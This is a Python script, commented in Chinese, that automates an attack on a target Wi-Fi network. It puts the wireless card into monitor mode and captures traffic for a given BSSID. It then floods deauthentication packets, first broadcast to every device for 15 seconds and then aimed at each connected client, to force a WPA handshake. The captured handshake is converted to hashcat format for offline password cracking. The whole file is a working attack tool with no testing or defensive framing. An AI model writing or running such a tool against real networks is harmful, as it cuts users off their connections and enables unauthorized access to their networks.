import sys
import time
import subprocess
import os
import csv
import glob

# ================= 配置 =================
TMP_PREFIX = "/tmp/handshake_capture"
CAP_FILE = f"{TMP_PREFIX}-01.cap"
CSV_FILE = f"{TMP_PREFIX}-01.csv"
HC_FILE = f"{TMP_PREFIX}-01.hc22000"
# =======================================

def log(msg):
    print(msg)
    sys.stdout.flush()

def run_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10)
        return result.stdout.decode(errors='ignore').strip()
    except:
        return ""

def get_actual_iface_name():
    """动态获取网卡名"""
    if os.path.exists("/sys/class/net/wlan0mon"): return "wlan0mon"
    ifaces = os.listdir('/sys/class/net')
    for iface in ifaces:
        if iface.startswith("eth") or iface.startswith("ens") or iface == "lo": continue
        return iface
    return "wlan0"

def get_connected_clients(bssid):
    """
    [核心] 解析 airodump 生成的 CSV，找出连接到目标 BSSID 的客户端 MAC
    """
    clients = []
    try:
        # CSV 文件可能还没生成完全，忽略错误
        if not os.path.exists(CSV_FILE): return []

        with open(CSV_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            
        # 找到 "Station MAC" 这一行的位置
        start_index = -1
        for i, line in enumerate(lines):
            if "Station MAC" in line:
                start_index = i
                break
        
        if start_index == -1: return []

        # 遍历客户端列表
        for line in lines[start_index+1:]:
            parts = line.split(',')
            if len(parts) < 6: continue
            
            client_mac = parts[0].strip()
            connected_bssid = parts[5].strip()
            
            # 只有当客户端连接的是我们的目标 BSSID 时才记录
            # 同时也排除掉广播地址和未关联状态
            if connected_bssid == bssid and client_mac != bssid:
                clients.append(client_mac)
                
    except Exception:
        pass
    return list(set(clients)) # 去重

def main():
    if len(sys.argv) < 4:
        log("[!] Params Error")
        sys.exit(1)

    target_bssid = sys.argv[1]
    target_channel = sys.argv[2]
    timeout = int(sys.argv[3])

    log(f"[*] --- 启动双重打击捕获 ---")

    # 1. 准备环境 (SSH 保护)
    current_iface = get_actual_iface_name()
    os.system("rfkill unblock wifi")
    os.system(f"nmcli device set {current_iface} managed no 2>/dev/null")
    os.system("killall wpa_supplicant 2>/dev/null")
    time.sleep(1)

    # 2. 开启监听
    run_cmd(f"airmon-ng start {current_iface}")
    mon_iface = get_actual_iface_name()
    log(f"[*] 攻击接口: {mon_iface} | 目标: {target_bssid}")

    # 3. 启动抓包 (必须开启 --output-format csv 以便脚本读取客户端)
    os.system(f"rm -f {TMP_PREFIX}*")
    os.system(f"iwconfig {mon_iface} channel {target_channel}")
    
    # 注意：这里我们同时输出 cap 和 csv
    dump_cmd = [
        "airodump-ng", 
        "-c", target_channel, 
        "--bssid", target_bssid, 
        "-w", TMP_PREFIX, 
        "--output-format", "csv,cap", 
        mon_iface
    ]
    
    with open(os.devnull, 'w') as devnull:
        dump_proc = subprocess.Popen(dump_cmd, stdout=devnull, stderr=devnull)

    time.sleep(3)
    start_time = time.time()
    last_attack_time = 0
    captured = False
    
    log("[*] 监听中... (前15秒全网断网，之后精准打击)")

    try:
        while (time.time() - start_time) < timeout:
            
            # A. 检查握手包
            if os.path.exists(CAP_FILE):
                res = run_cmd(f"aircrack-ng {CAP_FILE} 2>&1")
                if "1 handshake" in res:
                    log("\n[SUCCESS] CAPTURED")
                    log("[*] 捕获成功！")
                    
                    dump_proc.terminate()
                    try: dump_proc.wait(timeout=2)
                    except: dump_proc.kill()
                    os.system("killall -9 airodump-ng aireplay-ng 2>/dev/null")
                    
                    # 转换
                    time.sleep(1)
                    converter = "/usr/bin/hcxpcapngtool"
                    if not os.path.exists(converter): converter = "hcxpcapngtool"
                    run_cmd(f"{converter} -o {HC_FILE} {CAP_FILE}")
                    if os.path.exists(HC_FILE):
                        log(f"[SUCCESS] CONVERTED: {HC_FILE}")
                    
                    captured = True
                    break
            
            # B. 智能攻击策略 (每 5 秒执行一次)
            if time.time() - last_attack_time > 5:
                elapsed = time.time() - start_time
                
                # 再次锁信道
                os.system(f"iwconfig {mon_iface} channel {target_channel} 2>/dev/null")
                
                if elapsed < 15:
                    # === 阶段一：全网广播 AOE ===
                    log(f"[*] [阶段1] 发送全网广播断网包...")
                    cmd = f"aireplay-ng --deauth 15 --ignore-negative-one -a {target_bssid} {mon_iface}"
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    # === 阶段二：精准点名 ===
                    # 从 CSV 读取当前连接的客户端
                    clients = get_connected_clients(target_bssid)
                    
                    if not clients:
                        # 如果没读到客户端，继续用广播
                        log(f"[*] [阶段2] 未发现特定客户端，继续广播攻击...")
                        cmd = f"aireplay-ng --deauth 15 --ignore-negative-one -a {target_bssid} {mon_iface}"
                        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    else:
                        # 针对每个客户端发送定向攻击
                        log(f"[*] [阶段2] 发现 {len(clients)} 个客户端，开始逐个击破...")
                        for client_mac in clients:
                            log(f"    -> 攻击客户端: {client_mac}")
                            # -c 指定客户端 MAC，这种攻击几乎必断
                            cmd = f"aireplay-ng --deauth 5 --ignore-negative-one -a {target_bssid} -c {client_mac} {mon_iface}"
                            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            # 稍微间隔一下，防止网卡堵塞
                            time.sleep(0.5)
                
                last_attack_time = time.time()

            time.sleep(1)
            
    finally:
        if dump_proc.poll() is None: dump_proc.terminate()
        os.system("killall airodump-ng aireplay-ng 2>/dev/null")

    if not captured:
        log("\n[FAIL] TIMEOUT")

if __name__ == "__main__":
    main()